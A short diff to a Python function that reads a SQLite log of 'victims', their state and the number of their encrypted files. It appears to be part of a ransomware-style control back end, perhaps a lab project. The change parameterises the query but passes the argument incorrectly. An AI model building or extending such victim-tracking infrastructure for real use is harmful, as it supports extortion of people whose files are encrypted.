@@ -47,16 +47,18 @@ def history_req(victim_id):
     # Connection DB
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
-
-    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim = 1')
+    history = []
+    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim=?', victim_id)
     # récupération des résultats
     rows = c.fetchall()
 
     # affichage des résultats
     for row in rows:
-        print(row)
+        history += row
     conn.commit()
     conn.close()
+    return history
+
 
 def change_state(victim_id, state):
     # Connection DB
